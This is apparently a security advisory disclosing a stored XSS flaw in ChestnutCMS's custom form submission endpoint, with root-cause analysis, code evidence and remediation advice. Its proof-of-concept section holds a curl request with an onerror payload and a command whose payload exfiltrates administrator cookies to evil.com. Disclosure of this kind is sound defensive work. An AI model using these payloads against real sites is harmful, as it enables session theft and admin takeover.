# CAN-2026-2031969: Stored Cross-Site Scripting (XSS) in ChestnutCMS Custom Form

> **Vulnerability ID**: CAN-2026-2031969 (CVE candidate)
> **Report date**: 2026-06-16
> **Language**: English (简体中文版: [README_zh.md](./README_zh.md))

---

## 1. Vulnerability Identifier

| Field | Value |
|---|---|
| Vulnerability ID | CAN-2026-2031969 (CVE candidate) |
| Type | Stored Cross-Site Scripting (Stored XSS) (CWE-79) |
| Affected product | ChestnutCMS |
| Affected versions | `<= 1.5.13` (master branch, as of V1.5.13) |
| Fixed version | None (no official fix identified as of disclosure) |
| Vulnerable endpoint | `POST /api/customform/submit` |
| Vulnerable component | `CustomFormApiController#submitForm` |
| CVSS 3.1 | **9.6 Critical** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L` |
| Exploitation prerequisite | Public endpoint; **only the form `formId` is required** (custom forms do not enable login authentication or CAPTCHA by default) |

---

## 2. Description (CVE-style)

A stored cross-site scripting (XSS) vulnerability exists in the custom form data submission endpoint `POST /api/customform/submit` (`CustomFormApiController.submitForm`) of ChestnutCMS. When a form contains a rich-text field (`controlType='UEditor'`), the backend performs **no HTML filtering or XSS protection** on the rich-text content while saving the data (`CustomFormApiServiceImpl` → `ModelDataServiceImpl#saveModelData`; the rich-text field handler only performs a string conversion), and the malicious script is persisted to the database as-is. When an administrator views the rich-text field on the backend "Custom Form Data" page, the frontend `data.vue` renders the content directly via the `v-html` directive, causing the attacker-injected script to execute in the administrator's browser context.

Although a custom form can be configured at creation time to "require login" and "enable CAPTCHA", **both are disabled by default**; moreover, the form itself is **distributed externally** for scenarios such as surveys and registrations, and its `formId` is information obtainable through normal usage. Therefore, an **unauthenticated remote attacker needs only to know the `formId`** to submit form data carrying a malicious script, allowing them to steal administrator session credentials (Cookie / Token) and hijack the admin backend, impacting confidentiality and integrity; combined with backend privileges, this can further lead to privilege escalation and code execution.

---

## 3. Affected Versions

- **Affected**: ChestnutCMS `<= V1.5.13` (master branch HEAD = `ddb77bae`).
- **Not affected**: None (no fixed version identified as of the disclosure date).

---

## 4. Technical Details

### 4.1 Root cause

- **No backend sanitization**: The rich-text field handler `MetaControlType_UEditor.valueAsString()` only performs a simple string conversion and implements no tag / event filtering; data is persisted as-is via `saveModelData`.
- **Unsafe frontend rendering**: `data.vue:87` renders database content directly with `v-html`.

### 4.2 Data flow (Source → Sink)

```
POST /api/customform/submit
  └─ formData (rich-text field, fully attacker-controlled)   [Source]
     └─ CustomFormApiController.submitForm()
        └─ CustomFormApiServiceImpl.submit()                (no filtering)
           └─ ModelDataServiceImpl.saveModelData()          (persisted, no filtering)
              └─ MetaControlType_UEditor.valueAsString()    (no filtering)
                 └─ Database storage
                    └─ Backend data.vue:87  v-html          [Sink: script execution]
```

### 4.3 Key code evidence

**Backend entry** (`CustomFormApiController.java`):

```java
@PostMapping("/submit")
public R<Void> submitForm(@RequestBody Map<String, Object> formData, HttpServletRequest request) {
    // ... formId / captcha (optional) / uuid validation
    customFormApiService.submit(form, formData);  // submitted directly, no HTML filtering
    return R.ok();
}
```

**Backend save logic** (`CustomFormApiServiceImpl.java`):

```java
// only base64 images are processed, then saved as-is
this.modelDataService.saveModelData(form.getModelId(), formData);  // no HTML filtering
```

**Field value handling** (`ModelDataServiceImpl.java`):

```java
IMetaControlType controlType = getControlType(field.getControlType());
if (Objects.nonNull(fieldValue)) {
    fieldValue = controlType.valueAsString(fieldValue);  // UEditor type only does a string conversion, no filtering
}
```

**Frontend sink** (`data.vue:87`):

```vue
<div class="rich-content" v-html="scope.row[field.code]"></div>
```

---

## 5. Proof of Concept

### 5.1 Prerequisite: obtaining `formId`

1. Log in to the backend as administrator → **"Interactive Operations (互动运营) → Custom Form (自定义表单)"**;
2. Create a new custom form and add a **rich-text (UEditor)** field to it (e.g., with field code `content`);
3. The form's `formId` (auto-increment primary key) is the parameter needed for exploitation (e.g., `formId=1`).
4. Keep "require login" and "enable CAPTCHA" in their **default disabled** state to quickly reproduce.

> Once published, the form is exposed externally as a questionnaire, so `formId` is normally obtainable information and the exploitation barrier is very low.

### 5.2 Exploitation commands

The full automated verification script is at [`poc_customform_xss.py`](./poc_customform_xss.py) (assumes the form has CAPTCHA and login disabled, consistent with the system default):

```bash
python poc_customform_xss.py -t http://target -f 1 -F content
# custom payload (exfiltrate Cookie):
python poc_customform_xss.py -t http://target -f 1 -F content \
    -p '<img src=x onerror=fetch("https://evil.com/c?"+document.cookie)>'
```

Equivalent minimal `curl` request (`cc-uuid` may be any value; it is only a session identifier and is not validated by default):

```bash
curl -X POST 'http://target/api/customform/submit' \
  -H 'Content-Type: application/json' \
  -H 'cc-uuid: 123' \
  -d '{"formId": 1, "content": "<img src=x onerror=alert(document.cookie)>"}'
```

**Trigger**: administrator logs in to the backend → "CMS → Custom Form → Data Management (formId=1)" → the JavaScript in `onerror` executes in the administrator's browser.

**Indicators of success**:

- The endpoint returns `{"code":200,"msg":"操作成功"}` (operation successful) and the malicious content is written to the database;
- The attacker-controlled server receives a request containing the administrator's Cookie; or use `alert(document.cookie)` to observe a popup.

### 5.3 Verification video

- [ ] **Step 1**: In the backend "Interactive Operations → Custom Form", create a form and add a UEditor rich-text field, noting the `formId`
- [ ] **Step 2**: Run the PoC to submit the malicious payload; the endpoint returns `code:200`
- [ ] **Step 3**: An administrator views the rich-text field in the backend, and XSS triggers (popup / exfiltration request hits)

<video src="chestnutCMS_XSS_CAN-2026-2031969.mp4"></video>

---

## 6. Impact

- Steal administrator session credentials (Cookie / Token) and **hijack the admin backend**;
- Perform arbitrary backend operations as the administrator (data tampering, account takeover, site defacement / malware injection);
- Combined with existing high-risk backend features (e.g., code generation, theme import, script execution), this can further lead to remote code execution (RCE).

---

## 7. Mitigation & Remediation

1. **Backend sanitization (preferred)**: Apply unified HTML filtering to rich-text fields before persistence; **OWASP Java HtmlSanitizer** or **Jsoup `Safelist`** is recommended, allowing only safe tags and attributes.
2. **Frontend sanitization**: Sanitize with **DOMPurify** before rendering; avoid using `v-html` directly on untrusted data.
3. **Defense in depth**:
   - Deploy a strict **Content-Security-Policy** (disallow inline scripts; use nonce/hash);
   - Enable `HttpOnly` + `SameSite` for session cookies;
   - Define a `sanitize()` contract at the `IMetaControlType` interface level, mandating implementation by all rich-text control types.

---

## 8. References

- Full PoC script: [`poc_customform_xss.py`](./poc_customform_xss.py)
- CWE-79: Improper Neutralization of Input During Web Page Generation — https://cwe.mitre.org/data/definitions/79.html
